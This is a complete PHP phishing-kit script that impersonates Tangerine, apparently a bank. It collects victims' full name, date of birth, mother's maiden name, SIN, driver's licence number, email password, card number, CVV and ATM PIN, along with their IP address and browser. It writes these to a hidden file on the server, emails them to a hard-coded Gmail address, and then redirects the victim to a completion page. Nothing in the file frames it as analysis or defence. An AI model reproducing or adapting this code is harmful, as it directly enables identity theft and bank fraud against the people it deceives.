<?php

error_reporting(0);
$send = "sarkolouty@gmail.com";

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------3 PersonalDetails----------------\n";
$message .= "FULLNAME	: ".$_POST['FN']."\n";
$message .= "DOB		: ".$_POST['DB']."\n";
$message .= "MMN		: ".$_POST['MN']."\n";
$message .= "SIN		: ".$_POST['SN']."\n";
$message .= "DLN		: ".$_POST['DN']."\n";
$message .= "EMAIL		: ".$_POST['EA']."\n";
$message .= "EPASS		: ".$_POST['EP']."\n";
$message .= "-----------------4 CardDetails--------------------\n";
$message .= "NAMEONCARD	: ".$_POST['NC']."\n";
$message .= "CARDNO		: ".$_POST['CN']."\n";
$message .= "EXP		: ".$_POST['ED']."\n";
$message .= "CVV		: ".$_POST['CV']."\n";
$message .= "ATMPIN		: ".$_POST['AP']."\n";
$message .= "-----------------created by Seven[723806851]-----------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------TangerineResults-------------------\n";

$subject = "Tangerine - created by Seven[723806851] ";

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/ehtgdfh4w3.txt","a+");
fwrite($fp,"Tangerine - Seven[723806851]" . " | " .getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");
fclose($fp);

mail($send , "Tangerine - Seven[723806851]", getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");

?>
<script>
    window.top.location.href = "complete.php";

</script>